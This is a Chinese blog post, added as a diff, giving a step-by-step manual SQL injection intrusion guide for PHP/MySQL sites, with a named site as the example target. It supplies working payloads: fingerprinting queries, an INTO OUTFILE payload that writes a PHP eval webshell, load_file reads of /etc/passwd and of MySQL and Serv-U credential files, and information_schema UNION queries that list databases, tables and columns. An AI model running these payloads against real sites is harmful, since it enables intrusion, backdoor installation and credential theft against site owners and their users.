@@ -1,0 +1,69 @@
+php+mysql手工注入入侵总结   2009-11-17 16:49:13|  分类： SQL注入 |  标签： |字号大中小 订阅 .
+
+php+mysql手工注入入侵总结 
+2009-10-21 12:46 
+一 入侵的前奏
+假设我们的注入点是http://www.online-tools.cn/test.php?id=1 
+(1)爆物理路径
+1 这时通常我们在后面加个非法字符（比如单引号等等)，很有可能会爆出物理路径
+2 通过访问没有变量的地址，如http://www.online-tools.cn/test.php
+3 同过搜索引擎搜索站点，如site:www.online-tools.cn 有幸的话也能获得物理路径 
+4 直接访问数据连接文件
+这几种方法是我常用，当然你有其他的方法,这个主要靠大家收集，有好的方法希望大家也可以告诉我下，让我也学习下，呵呵
+(2)魔术引号开关magic_quotes_gpc
+这个用pangolin基本上都可以猜出来,其实我们完全可以在注入点后加 and '1'='1'/* 放回正常表明GPC关，否则表明GPC开
+原理分析： 当GPC开启时，会对' 进行转义，使其变成 \'
+select * from online-tools where id=$id ---经过php转义后---> select * from online-tools where id=1 and \'1\'=\'1\'
+而在mysql不支持\'的符号，所以and后面语句为错，即该句查询错误，所以页面会放回错误
+
+(3)判断mysql版本和数据库权限
+条件1 and ord(mid(version(),1,1))>51/* 判断版本号，只用大于51的话就才能使用union联合查询
+条件2 and ord(mid(version(),1,1))=53/* 判断mysql是否为5.0，因为5.0可以使用 information_schema 系统数据库
+条件3 and ord(mid(user(),1,1))=114 and ord(mid(user(),2,1))=111 and ord(mid(user(),3,1))=111 and ord(mid(user(),4,1))=116 /* 判断root用户权限
+
+
+二 入侵方案制定
+1 如果(1)物理路径知道 且 (2)中的魔术引号开关 关 且 (3)中的条件1 & 条件3 均满足，这时完全可以直接导出一句话木马
+id=1?and 1=2 union select 1,2,<?php eval($_POST['#']);?>,4,5 into outfile '/online-tools.cn/shell.php'/* (最好将一句话木马变成16进制形式)
+2 如果(2)中的魔术引号开关 开 且 (3)中仅条件(1)满足，
+这时候只能通过order by 字段数 /* 猜字段数，然后用union select猜管理员表，猜字段，然后穷爆内容,并寻找后台登陆
+（注:这中情况注入工具（pangolin）不好使，大家可以编写个php脚本来辅助猜表和字段）
+
+3 如果(1)物理路径知道 且 (3)中仅条件3满足，
+可以用load_file函数查看文件源码，寻找敏感信息和管理后台，登陆后台上传上传webshell 
+(注：load_file其实并不需要root权限，有时候普通用户也能用该函数，这主要看管理员的配置）
+常用的配置文件路径如下
+Linux
+/etc/passwd
+/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
+/usr/local/apache2/conf/httpd.conf
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
+/usr/local/app/php5/lib/php.ini //PHP相关设置
+/etc/sysconfig/iptables //从中得到防火墙规则策略
+/etc/httpd/conf/httpd.conf // apache配置文件
+/etc/rsyncd.conf //同步程序配置文件
+/etc/sysconfig/network-scripts/ifcfg-eth0 //查看IP.
+/etc/my.cnf //mysql的配置文件
+/etc/redhat-release //系统版本
+
+Windows 
+c:\boot.ini //windows系统特有的配置文件
+c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
+c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
+c:\Program Files\Serv-U\ServUDaemon.ini
+c:\windows\my.ini //MYSQL配置文件
+c:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
+等等....
+其实还有其他很多文件，这个需要自己平时收集和积累，当然有时也需要根据网站所采用的系统来决定
+
+4 如果(3)中仅条件2满足
+这时候我们也只能通过order by 字段数 /* 猜字段数，然后用union select猜管理员表，猜字段，然后穷爆内容,并寻找后台登陆，不过此时我们可以借助mysql5.0的特性直接猜表： 
+
+http://www.online-tools.cn/test.php?id=1%20union%20select%201,2,SCHEMA_NAME%20from%20information_schema.SCHEMATA%20limit%208,1/* 遍历库
+
+http://www.online-tools.cn/test.php?id=1%20union%20select%201,2,TABLE_NAME%20from%20information_schema.TABLES%20where/**/TABLE_SCHEMA=数据库的16进制值%20limit%208,1/* 遍历表
+
+http://www.online-tools.cn/test.php?id=1%20union%20select%201,2,COLUMN_NAME%20from%20information_schema.COLUMNS%20where/**/TABLE_NAME=表名的16进制%20limit%208,1/* 遍历列名
+
+通过这些信息最后我们就可以直接爆出数据了，当然这种情况我们可以直接用pangolin来猜，主要pangolin有时猜不全，这时我们就只能求助于手工了。
+ 
